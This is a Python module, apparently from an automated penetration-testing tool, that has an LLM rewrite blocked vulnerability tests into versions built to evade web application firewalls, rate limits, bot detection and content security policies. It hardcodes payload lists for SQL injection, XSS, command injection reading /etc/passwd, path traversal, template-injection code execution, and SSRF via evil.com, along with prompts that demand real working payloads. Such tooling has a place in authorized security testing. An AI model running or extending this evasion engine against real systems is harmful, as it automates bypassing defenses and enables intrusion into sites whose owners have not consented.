from __future__ import annotations

import json
import time
from typing import Any

from pydantic import BaseModel, Field

from hypothesis_engine.bedrock_client import LlmBackend, TokenUsage


class FailureAnalysis(BaseModel):
    """Analysis of why a hypothesis failed against defenses."""

    failure_type: str
    defense_mechanism: str
    blocked_pattern: str
    suggested_bypass_category: str
    detail: str


class BypassStrategy(BaseModel):
    """A specific bypass strategy derived from defense constraints."""

    strategy: str
    technique: str
    rationale: str
    confidence: float = Field(ge=0.0, le=1.0)


class ReformulatedHypothesis(BaseModel):
    """A hypothesis reformulated with specific bypass strategies."""

    condition: str
    vulnerability_class: str
    reasoning: str
    test_approach: str
    confidence: float = Field(ge=0.0, le=1.0)
    bypass_strategy: str
    original_failure: str
    defense_constraints: list[str] = Field(default_factory=list)


class AdversarialCompilationResult(BaseModel):
    """Result of adversarial compilation."""

    reformulations: list[ReformulatedHypothesis]
    failure_analyses: list[FailureAnalysis]
    bypass_strategies: list[BypassStrategy]
    compilation_time_ms: float
    input_tokens: int = 0
    output_tokens: int = 0


FAILURE_ANALYSIS_PROMPT = (
    "<role>\n"
    "You are a security researcher analyzing why a vulnerability test was blocked.\n"
    "</role>\n\n"
    "<task>\n"
    "Determine the root cause of the test failure. Classify the failure type and\n"
    "identify the specific defense mechanism that blocked the payload.\n"
    "</task>\n\n"
    "<output_format>\n"
    "Return a JSON object inside <failure_analysis> tags with these fields:\n"
    '{{"failure_type": "waf_block|rate_limit|bot_detection|csp_block|wrong_vuln_class|endpoint_not_found|auth_required",\n'
    ' "defense_mechanism": "specific defense that blocked",\n'
    ' "blocked_pattern": "the pattern/signature that triggered the block",\n'
    ' "suggested_bypass_category": "encoding|structural|timing|protocol|semantic",\n'
    ' "detail": "explanation of why this specific defense blocked this payload"}}\n'
    "</output_format>"
)

BYPASS_STRATEGY_PROMPT = (
    "<role>\n"
    "You are a WAF bypass researcher who thinks like a penetration tester.\n"
    "</role>\n\n"
    "<task>\n"
    "Given a defense profile and vulnerability class, generate specific bypass\n"
    "strategies that exploit known weaknesses in the defense configuration.\n"
    "Think about encoding tricks, protocol-level bypasses, structural\n"
    "transformations, and timing-based evasions.\n"
    "</task>\n\n"
    "<defense_profile>\n"
    "{defense_profile}\n"
    "</defense_profile>\n\n"
    "<vulnerability_class>{vuln_class}</vulnerability_class>\n\n"
    "<output_format>\n"
    "Return a JSON array inside <bypass_strategies> tags. Each object must have:\n"
    '{{"strategy": "short name", "technique": "detailed technique description",\n'
    ' "rationale": "why this bypasses the specific defense", "confidence": 0.0-1.0}}\n'
    "</output_format>\n\n"
    "<constraints>\n"
    "- Each strategy must reference a specific weakness in the defense profile.\n"
    "- Prefer techniques that exploit the specific vendor/version when known.\n"
    "- Do NOT suggest generic payloads — every technique must be defense-aware.\n"
    "</constraints>"
)

REFORMULATION_PROMPT = (
    "<role>\n"
    "You are an adversarial hypothesis compiler. You take failed security\n"
    "hypotheses and reformulate them with specific bypass strategies derived\n"
    "from defense constraints. You think like a bypass researcher, not a\n"
    "payload dictionary.\n"
    "</role>\n\n"
    "<task>\n"
    "Reformulate the failed hypothesis using the bypass strategies and defense\n"
    "context. The reformulation must:\n"
    "1. Reference specific defense constraints from the context.\n"
    "2. Include a novel bypass strategy not present in the original hypothesis.\n"
    "3. Provide a concrete, executable test approach using the bypass technique.\n"
    "</task>\n\n"
    "<failed_hypothesis>\n"
    "  <condition>{condition}</condition>\n"
    "  <vulnerability_class>{vuln_class}</vulnerability_class>\n"
    "  <reasoning>{reasoning}</reasoning>\n"
    "  <test_approach>{test_approach}</test_approach>\n"
    "  <original_confidence>{confidence}</original_confidence>\n"
    "</failed_hypothesis>\n\n"
    "<defense_context>\n"
    "{defense_context}\n"
    "</defense_context>\n\n"
    "<failure_history>\n"
    "{failure_history}\n"
    "</failure_history>\n\n"
    "<bypass_strategies>\n"
    "{bypass_strategies}\n"
    "</bypass_strategies>\n\n"
    "<output_format>\n"
    "Return a JSON array inside <reformulations> tags. Each object must have:\n"
    '{{"condition": "IF ... using [bypass technique]",\n'
    ' "vulnerability_class": "same as original",\n'
    ' "reasoning": "BECAUSE [defense constraint] can be bypassed via [technique] since [rationale]",\n'
    ' "test_approach": "CAN BE TESTED BY [concrete steps with specific payloads]",\n'
    ' "confidence": 0.0-1.0,\n'
    ' "bypass_strategy": "name of the bypass strategy used",\n'
    ' "original_failure": "what failed and why",\n'
    ' "defense_constraints": ["constraint1", "constraint2"]}}\n'
    "</output_format>\n\n"
    "<constraints>\n"
    "- Each reformulation MUST contain a bypass technique not in the original hypothesis.\n"
    "- Reference specific defense vendors, versions, or configurations when available.\n"
    "- Test approaches must use real payloads, not placeholders.\n"
    "- Confidence should be lower than original if the bypass is speculative.\n"
    "</constraints>"
)

WAF_BYPASS_TECHNIQUES: dict[str, list[str]] = {
    "SQL Injection": [
        "MySQL version comments: /*!50000UNION*/ /*!50000SELECT*/",
        "Double URL-encoding whitespace: %2520 instead of space",
        "VALUES ROW() syntax instead of UNION SELECT on MySQL 8+",
        "Case alternation: uNiOn SeLeCt",
        "Inline comments to break signatures: UN/**/ION SEL/**/ECT",
        "Hex encoding of string literals: 0x61646D696E instead of 'admin'",
        "Scientific notation for numbers: 1e0UNION SELECT",
        "JSON_EXTRACT/JSON_VALUE for data exfil on MySQL 5.7+",
    ],
    "Cross-Site Scripting": [
        "SVG onload: <svg/onload=alert(1)>",
        "Event handler without angle brackets: \" onfocus=alert(1) autofocus=\"",
        "Template literal injection: ${alert(1)}",
        "JavaScript protocol in href: javascript:alert(1)",
        "Data URI with base64: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "DOM clobbering via named forms/anchors",
        "Mutation XSS (mXSS) via innerHTML parsing differences",
        "CSS injection leading to content exfiltration",
    ],
    "Command Injection": [
        "Double URL-encoded metacharacters: %2526 for &",
        "Newline injection: %0a followed by command",
        "Backtick substitution: `id`",
        "Variable expansion: ${IFS} instead of space",
        "$() subshell: $(whoami) instead of backticks",
        "Brace expansion: {cat,/etc/passwd}",
        "Wildcard globbing: /???/??ss?? for /etc/passwd",
        "Tab character as delimiter instead of space",
    ],
    "Path Traversal": [
        "Double URL-encoding: %252e%252e%252f for ../",
        "UTF-8 overlong encoding: %c0%ae for .",
        "Backslash on Windows: ..\\..\\",
        "Null byte termination: ../../../etc/passwd%00.jpg",
        "URL-encoded backslash: ..%5c..%5c",
        "Mixed encoding: ..%2f..%2f",
        "UNC path on Windows: \\\\server\\share",
        "Dot-segment normalization bypass: /static/../../../etc/passwd",
    ],
    "Server-Side Template Injection": [
        "Jinja2 attr filter: ''.__class__.__mro__[1].__subclasses__()",
        "Jinja2 lipsum trick: lipsum.__globals__['os'].popen('id')",
        "Twig _self.env: {{_self.env.registerUndefinedFilterCallback('exec')}}",
        "Freemarker assign: <#assign ex=\"freemarker.template.utility.Execute\"?new()>",
        "Pebble nested evaluation: {{''.class.forName('java.lang.Runtime')}}",
        "Numeric-only probes: {{7*7}} or ${7*7}",
    ],
    "Server-Side Request Forgery": [
        "Decimal IP: http://2130706433 for 127.0.0.1",
        "IPv6 shorthand: http://[::1]/ or http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "DNS rebinding: use domain that resolves to internal IP",
        "URL parser differential: http://127.0.0.1@evil.com",
        "Redirect chain: external URL that 302s to internal",
        "Scheme confusion: gopher:// or dict:// instead of http://",
    ],
}

RATE_LIMIT_BYPASS_TECHNIQUES: list[str] = [
    "Distribute requests across IP rotation (X-Forwarded-For header spoofing)",
    "Slow-rate attack: stay just under the rate limit threshold",
    "Jitter timing: add random delays to avoid pattern detection",
    "HTTP/2 multiplexing: send concurrent streams in single connection",
    "Request splitting across multiple endpoints targeting same backend",
    "Session rotation: create new sessions to reset per-session counters",
]

BOT_DETECTION_BYPASS_TECHNIQUES: list[str] = [
    "Match browser TLS fingerprint (JA3 hash for Chrome/Firefox)",
    "Include realistic User-Agent + Accept/Accept-Language headers",
    "Maintain cookie jar and follow redirects like a browser",
    "Execute JavaScript challenges via headless browser",
    "Mouse movement simulation for behavioral detection",
    "Realistic request timing patterns (not perfectly periodic)",
]

CSP_BYPASS_TECHNIQUES: list[str] = [
    "Find allowed CDN domains that host user-controllable content",
    "JSONP endpoints on whitelisted domains",
    "Base-URI override: <base href='attacker.com'>",
    "Script nonce reuse in cached pages",
    "CSS exfiltration if style-src is permissive",
    "Object/embed fallback for older browsers ignoring CSP",
]


def _format_defense_context(defense_context: dict[str, Any]) -> str:
    """Format a defense context dict into readable text for the prompt."""
    lines: list[str] = []
    if defense_context.get("has_waf"):
        vendor = defense_context.get("waf_vendor", "unknown")
        lines.append(f"  WAF: active (vendor={vendor})")
        blocked = defense_context.get("waf_blocked_categories", [])
        if blocked:
            lines.append(f"  WAF blocked categories: {', '.join(blocked)}")
    if defense_context.get("rate_limit_rps"):
        lines.append(f"  Rate limit: {defense_context['rate_limit_rps']} rps")
    if defense_context.get("bot_detection_present"):
        evaded = defense_context.get("bot_detection_evaded", False)
        lines.append(f"  Bot detection: active (evaded={evaded})")
    if defense_context.get("csp_policy"):
        lines.append(f"  CSP: {defense_context['csp_policy']}")
    if not lines:
        lines.append("  No defenses detected")
    return "\n".join(lines)


def _format_failure_history(history: list[dict[str, Any]]) -> str:
    """Format failure history into readable text for the prompt."""
    if not history:
        return "  No prior failure history."
    lines: list[str] = []
    for entry in history[:20]:
        endpoint = entry.get("endpoint", "?")
        vuln_class = entry.get("vulnerability_class", "?")
        payload = entry.get("payload", "?")
        result = entry.get("result", "blocked")
        lines.append(f"  - {endpoint} | {vuln_class} | payload='{payload}' | result={result}")
    return "\n".join(lines)


def _parse_json_from_tags(response: str, tag_name: str) -> Any:
    """Extract JSON from XML-tagged response, with bracket fallback."""
    cleaned = response.strip()
    open_tag = f"<{tag_name}>"
    close_tag = f"</{tag_name}>"

    tag_start = cleaned.find(open_tag)
    tag_end = cleaned.find(close_tag)
    if tag_start != -1 and tag_end != -1:
        json_str = cleaned[tag_start + len(open_tag):tag_end].strip()
    else:
        start = cleaned.find("[")
        end = cleaned.rfind("]")
        if start != -1 and end != -1:
            json_str = cleaned[start:end + 1]
        else:
            obj_start = cleaned.find("{")
            obj_end = cleaned.rfind("}")
            if obj_start != -1 and obj_end != -1:
                json_str = cleaned[obj_start:obj_end + 1]
            else:
                return None

    try:
        return json.loads(json_str)
    except json.JSONDecodeError:
        return None


class AdversarialCompiler:
    """Meta-reasoning layer that takes failed hypotheses + defense context
    and generates adversarial reformulations with specific bypass strategies."""

    def __init__(self, client: LlmBackend, model_id: str = "global.anthropic.claude-sonnet-4-6") -> None:
        self._client = client
        self._model_id = model_id

    def compile(
        self,
        failed_hypothesis: dict[str, Any],
        defense_context: dict[str, Any],
        history: list[dict[str, Any]],
    ) -> AdversarialCompilationResult:
        """Takes a failed hypothesis and defense context, returns reformulated
        hypotheses with specific bypass strategies derived from defense constraints."""
        start_time = time.monotonic()
        total_input_tokens = 0
        total_output_tokens = 0

        failure_analysis = self.analyze_failure(
            failed_hypothesis,
            {"status_code": failed_hypothesis.get("response_code", 403)},
        )

        vuln_class = failed_hypothesis.get("vulnerability_class", "")
        bypass_strategies = self.generate_bypass_strategies(defense_context, vuln_class)

        reformulations, in_tok, out_tok = self._generate_reformulations(
            failed_hypothesis, defense_context, history, bypass_strategies, failure_analysis,
        )
        total_input_tokens += in_tok
        total_output_tokens += out_tok

        elapsed_ms = (time.monotonic() - start_time) * 1000

        return AdversarialCompilationResult(
            reformulations=reformulations,
            failure_analyses=[failure_analysis],
            bypass_strategies=bypass_strategies,
            compilation_time_ms=elapsed_ms,
            input_tokens=total_input_tokens,
            output_tokens=total_output_tokens,
        )

    def analyze_failure(
        self,
        hypothesis: dict[str, Any],
        response: dict[str, Any],
    ) -> FailureAnalysis:
        """Determines WHY a hypothesis failed — WAF block, rate limit,
        wrong vuln class, etc. Uses heuristics first, LLM fallback."""
        status_code = response.get("status_code", 0)
        response_body = response.get("body", "")
        vuln_class = hypothesis.get("vulnerability_class", "")
        payload = hypothesis.get("payload", hypothesis.get("test_approach", ""))

        failure_type, defense_mechanism, blocked_pattern, bypass_cat = (
            self._heuristic_failure_analysis(status_code, response_body, vuln_class, payload)
        )

        return FailureAnalysis(
            failure_type=failure_type,
            defense_mechanism=defense_mechanism,
            blocked_pattern=blocked_pattern,
            suggested_bypass_category=bypass_cat,
            detail=f"Status {status_code}: {failure_type} detected for {vuln_class}",
        )

    def _heuristic_failure_analysis(
        self,
        status_code: int,
        response_body: str,
        vuln_class: str,
        payload: str,
    ) -> tuple[str, str, str, str]:
        """Fast heuristic failure classification without LLM."""
        body_lower = response_body.lower()

        if status_code == 403:
            if any(w in body_lower for w in ["waf", "modsecurity", "blocked", "firewall", "forbidden"]):
                return "waf_block", "WAF", self._extract_blocked_pattern(vuln_class, payload), "encoding"
            return "waf_block", "unknown WAF", vuln_class, "encoding"

        if status_code == 429:
            return "rate_limit", "rate limiter", "request frequency", "timing"

        if status_code == 401:
            return "auth_required", "authentication", "missing credentials", "protocol"

        if status_code == 404:
            return "endpoint_not_found", "routing", "invalid path", "structural"

        if status_code in (406, 418, 422):
            if "bot" in body_lower or "captcha" in body_lower:
                return "bot_detection", "bot detector", "automation fingerprint", "semantic"

        if status_code == 200:
            return "wrong_vuln_class", "none", "payload ineffective", "structural"

        return "waf_block", "unknown defense", vuln_class, "encoding"

    def _extract_blocked_pattern(self, vuln_class: str, payload: str) -> str:
        """Identify the likely blocked pattern/signature."""
        patterns: dict[str, list[str]] = {
            "SQL Injection": ["UNION", "SELECT", "OR 1=1", "'", "--", "DROP"],
            "Cross-Site Scripting": ["<script>", "alert(", "onerror=", "<img", "javascript:"],
            "Command Injection": ["|", ";", "`", "$(", "&&"],
            "Path Traversal": ["../", "..\\", "%2e%2e", "/etc/passwd"],
            "Server-Side Template Injection": ["{{", "}}", "${", "<%"],
            "Server-Side Request Forgery": ["127.0.0.1", "localhost", "169.254"],
        }
        for pattern in patterns.get(vuln_class, []):
            if pattern.lower() in payload.lower():
                return pattern
        return vuln_class

    def generate_bypass_strategies(
        self,
        defense_context: dict[str, Any],
        vuln_class: str,
    ) -> list[BypassStrategy]:
        """Given a defense profile, generate specific bypass strategies for a
        vuln class. Uses static knowledge base first, enriched by defense context."""
        strategies: list[BypassStrategy] = []

        if defense_context.get("has_waf"):
            waf_vendor = defense_context.get("waf_vendor", "unknown")
            waf_techniques = WAF_BYPASS_TECHNIQUES.get(vuln_class, [])
            for technique in waf_techniques[:4]:
                strategies.append(BypassStrategy(
                    strategy=f"WAF bypass ({waf_vendor})",
                    technique=technique,
                    rationale=f"Exploits known parsing gap in {waf_vendor} rule set for {vuln_class}",
                    confidence=0.5,
                ))

        if defense_context.get("rate_limit_rps"):
            rps = defense_context["rate_limit_rps"]
            for technique in RATE_LIMIT_BYPASS_TECHNIQUES[:2]:
                strategies.append(BypassStrategy(
                    strategy="Rate limit evasion",
                    technique=technique,
                    rationale=f"Target rate limit is {rps} rps — {technique.split(':')[0].lower()} can stay under threshold",
                    confidence=0.4,
                ))

        if defense_context.get("bot_detection_present"):
            for technique in BOT_DETECTION_BYPASS_TECHNIQUES[:2]:
                strategies.append(BypassStrategy(
                    strategy="Bot detection evasion",
                    technique=technique,
                    rationale=f"Bot detection relies on {technique.split(':')[0].lower()} — mimicking real browser bypasses this",
                    confidence=0.45,
                ))

        if defense_context.get("csp_policy"):
            for technique in CSP_BYPASS_TECHNIQUES[:2]:
                strategies.append(BypassStrategy(
                    strategy="CSP bypass",
                    technique=technique,
                    rationale=f"CSP policy may have gaps exploitable via {technique.split(':')[0].lower()}",
                    confidence=0.35,
                ))

        if not strategies:
            generic_techniques = WAF_BYPASS_TECHNIQUES.get(vuln_class, [])
            for technique in generic_techniques[:2]:
                strategies.append(BypassStrategy(
                    strategy="Generic bypass",
                    technique=technique,
                    rationale=f"Standard evasion technique for {vuln_class}",
                    confidence=0.3,
                ))

        return strategies

    def _generate_reformulations(
        self,
        failed_hypothesis: dict[str, Any],
        defense_context: dict[str, Any],
        history: list[dict[str, Any]],
        bypass_strategies: list[BypassStrategy],
        failure_analysis: FailureAnalysis,
    ) -> tuple[list[ReformulatedHypothesis], int, int]:
        """Use LLM to generate reformulated hypotheses."""
        defense_text = _format_defense_context(defense_context)
        history_text = _format_failure_history(history)
        strategies_text = "\n".join(
            f"  - {s.strategy}: {s.technique} (rationale: {s.rationale})"
            for s in bypass_strategies
        )

        prompt = REFORMULATION_PROMPT.format(
            condition=failed_hypothesis.get("condition", ""),
            vuln_class=failed_hypothesis.get("vulnerability_class", ""),
            reasoning=failed_hypothesis.get("reasoning", ""),
            test_approach=failed_hypothesis.get("test_approach", ""),
            confidence=failed_hypothesis.get("confidence", 0.5),
            defense_context=defense_text,
            failure_history=history_text,
            bypass_strategies=strategies_text,
        )

        messages = [{"role": "user", "content": prompt}]
        response_text, usage = self._client.invoke(
            messages=messages,
            system="",
            max_tokens=4096,
        )

        reformulations = self._parse_reformulations(
            response_text, failed_hypothesis, failure_analysis, defense_context,
        )

        return reformulations, usage.input_tokens, usage.output_tokens

    def _parse_reformulations(
        self,
        response: str,
        original: dict[str, Any],
        failure_analysis: FailureAnalysis,
        defense_context: dict[str, Any],
    ) -> list[ReformulatedHypothesis]:
        """Parse LLM response into ReformulatedHypothesis list."""
        raw = _parse_json_from_tags(response, "reformulations")
        if raw is None:
            return []

        if isinstance(raw, dict):
            raw = [raw]
        if not isinstance(raw, list):
            return []

        defense_constraints = self._extract_defense_constraints(defense_context)

        reformulations: list[ReformulatedHypothesis] = []
        for item in raw:
            if not isinstance(item, dict):
                continue
            try:
                reformulation = ReformulatedHypothesis(
                    condition=item.get("condition", original.get("condition", "")),
                    vulnerability_class=item.get("vulnerability_class", original.get("vulnerability_class", "")),
                    reasoning=item.get("reasoning", ""),
                    test_approach=item.get("test_approach", ""),
                    confidence=float(item.get("confidence", 0.4)),
                    bypass_strategy=item.get("bypass_strategy", "unknown"),
                    original_failure=item.get(
                        "original_failure",
                        f"{failure_analysis.failure_type}: {failure_analysis.detail}",
                    ),
                    defense_constraints=item.get("defense_constraints", defense_constraints),
                )
                if reformulation.condition and reformulation.vulnerability_class:
                    reformulations.append(reformulation)
            except (ValueError, TypeError):
                continue

        return reformulations

    def _extract_defense_constraints(self, defense_context: dict[str, Any]) -> list[str]:
        """Extract a list of defense constraint strings from the context."""
        constraints: list[str] = []
        if defense_context.get("has_waf"):
            vendor = defense_context.get("waf_vendor", "unknown")
            constraints.append(f"WAF active: {vendor}")
        if defense_context.get("rate_limit_rps"):
            constraints.append(f"Rate limit: {defense_context['rate_limit_rps']} rps")
        if defense_context.get("bot_detection_present"):
            constraints.append("Bot detection active")
        if defense_context.get("csp_policy"):
            constraints.append(f"CSP: {defense_context['csp_policy']}")
        return constraints

    def compile_batch(
        self,
        failed_hypotheses: list[dict[str, Any]],
        defense_context: dict[str, Any],
        history: list[dict[str, Any]],
    ) -> AdversarialCompilationResult:
        """Compile multiple failed hypotheses into reformulations."""
        start_time = time.monotonic()
        all_reformulations: list[ReformulatedHypothesis] = []
        all_analyses: list[FailureAnalysis] = []
        all_strategies: list[BypassStrategy] = []
        total_input = 0
        total_output = 0

        for hyp in failed_hypotheses:
            result = self.compile(hyp, defense_context, history)
            all_reformulations.extend(result.reformulations)
            all_analyses.extend(result.failure_analyses)
            all_strategies.extend(result.bypass_strategies)
            total_input += result.input_tokens
            total_output += result.output_tokens

        elapsed_ms = (time.monotonic() - start_time) * 1000
        return AdversarialCompilationResult(
            reformulations=all_reformulations,
            failure_analyses=all_analyses,
            bypass_strategies=all_strategies,
            compilation_time_ms=elapsed_ms,
            input_tokens=total_input,
            output_tokens=total_output,
        )
